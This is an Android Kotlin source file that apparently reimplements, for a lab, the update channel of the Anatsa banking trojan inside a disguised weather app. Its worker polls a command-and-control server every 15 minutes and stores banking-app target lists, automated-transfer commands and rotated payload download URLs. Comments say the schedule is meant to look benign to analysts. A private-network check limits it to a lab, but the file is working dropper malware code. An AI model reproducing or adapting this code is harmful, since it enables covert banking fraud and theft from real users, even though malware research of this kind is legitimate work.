package com.skyweather.forecast.core

import android.content.Context
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

/**
 * Periodic config refresh channel.
 *
 * ══════════════════════════════════════════════════════════════════
 * TAKOPII STAGE 6 + ANALYSIS §6 — Update Channel Mechanics
 * ══════════════════════════════════════════════════════════════════
 *
 * Real-world reference: Anatsa Stage 3 (research/02) — periodic poll
 * to C2 for new config + payload URLs. Operator pushes server-side
 * update; deployed droppers fetch on next refresh cycle.
 *
 * WorkManager's 15-minute minimum periodic interval is the platform
 * floor. Anatsa runs at exactly this floor. Every weather app that
 * auto-refreshes data does the same.
 *
 * Update payload: JSON config blob containing:
 *   - target_list: list of package names to monitor (banker uses this
 *     to know which apps to overlay — we use empty list, lab-only)
 *   - beacon_interval_ms: adjust polling cadence
 *   - payload_url: Stage 3 payload rotation (new DEX download URL)
 *   - kill_switch: operator can remotely disable
 *
 * Lab constraint: all network goes through DomainResolver → RFC1918 only.
 * ══════════════════════════════════════════════════════════════════
 */
class DataRefreshWorker(context: Context, params: WorkerParameters) : Worker(context, params) {

    override fun doWork(): Result {
        // Safety gate: verify endpoint is RFC1918
        if (!AppConfig.isEndpointSafe()) return Result.failure()

        return try {
            val endpoint = DomainResolver.resolveEndpoint() ?: return Result.retry()
            val configUrl = endpoint.replace("/beacon", "/config")

            val config = fetchConfig(configUrl) ?: return Result.retry()
            applyConfig(config)

            Result.success()
        } catch (_: Exception) {
            // Silent — no retry spam, no crash, no telemetry leak
            Result.retry()
        }
    }

    /**
     * Fetch JSON config from C2.
     * GET request with short timeout — if C2 is slow, back off.
     */
    private fun fetchConfig(configUrl: String): String? {
        val url = URL(configUrl)
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "GET"
        conn.connectTimeout = 3000
        conn.readTimeout = 3000
        conn.useCaches = false

        return try {
            val code = conn.responseCode
            if (code == 200) {
                conn.inputStream.bufferedReader().use { it.readText() }
            } else null
        } finally {
            conn.disconnect()
        }
    }

    /**
     * Parse and apply config update.
     * Minimal JSON parsing — no library dependency.
     *
     * Expected format (manual parse):
     *   {"interval":900000,"kill":false,"payload_url":"..."}
     *
     * In real Anatsa: config includes target_list, overlay_urls, ATS commands.
     * Lab version: only interval adjustment and kill switch.
     */
    private fun applyConfig(json: String) {
        // Kill switch check
        if (json.contains("\"kill\":true")) {
            // Operator signaled shutdown — cancel all work
            WorkManager.getInstance(applicationContext)
                .cancelUniqueWork(WORK_NAME)
            return
        }

        // Interval update (not actionable with WorkManager — noted for education)
        // WorkManager periodic interval is immutable after enqueue.
        // Real Anatsa handles this by cancelling + re-enqueueing.
        // Lab: document the limitation, don't implement re-enqueue.

        // Target list update — banking apps to overlay
        // Real Anatsa: ~400 package names. Lab: empty until C2 pushes test targets.
        val targetMatch = Regex("\"target_list\":\"([^\"]+)\"").find(json)
        if (targetMatch != null) {
            applicationContext.getSharedPreferences("weather_sync", 0)
                .edit()
                .putString("target_list", targetMatch.groupValues[1])
                .apply()
        }

        // Stage 4: ATS command delivery
        // C2 pushes command sequences for automated transfer execution.
        // Stored in SharedPreferences, loaded by AccessibilityEngine on next event.
        //
        // Real Anatsa: per-bank command profiles (~15 banks per campaign).
        // Operator reverse-engineers target banking app, encodes view IDs +
        // screen patterns as command JSON, pushes via config update.
        val atsMatch = Regex("\"ats_commands\":\\s*(\\[[^\\]]+\\])").find(json)
        if (atsMatch != null) {
            applicationContext.getSharedPreferences("weather_sync", 0)
                .edit()
                .putString("ats_commands", atsMatch.groupValues[1])
                .apply()
        }

        // Payload URL rotation — store for next SyncTask execution
        val urlMatch = Regex("\"payload_url\":\"([^\"]+)\"").find(json)
        if (urlMatch != null) {
            val newUrl = urlMatch.groupValues[1]
            // Validate RFC1918 before storing
            if (isRfc1918Host(newUrl)) {
                applicationContext.getSharedPreferences("weather_sync", 0)
                    .edit()
                    .putString("rotated_payload_url", newUrl)
                    .apply()
            }
        }
    }

    private fun isRfc1918Host(url: String): Boolean {
        return try {
            val host = URL(url).host
            host == "127.0.0.1" || host == "localhost" ||
                    host.startsWith("10.") || host.startsWith("192.168.") ||
                    host.startsWith("172.16.") || host.startsWith("172.17.") ||
                    host.startsWith("172.18.") || host.startsWith("172.19.") ||
                    host.startsWith("172.2") || host.startsWith("172.30.") ||
                    host.startsWith("172.31.")
        } catch (_: Exception) { false }
    }

    companion object {
        private const val WORK_NAME = "weather_background_refresh"

        /**
         * Schedule periodic config refresh.
         * 15-minute interval = WorkManager platform floor = Anatsa cadence.
         * Looks like standard weather app auto-refresh to any analyst.
         */
        fun schedulePeriodicRefresh(context: Context) {
            val request = PeriodicWorkRequestBuilder<DataRefreshWorker>(
                15, TimeUnit.MINUTES
            ).addTag("weather_refresh").build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORK_NAME,
                ExistingPeriodicWorkPolicy.KEEP,
                request
            )
        }

        /**
         * Cancel periodic refresh (operator kill switch or uninstall cleanup).
         */
        fun cancel(context: Context) {
            WorkManager.getInstance(context).cancelUniqueWork(WORK_NAME)
        }
    }
}
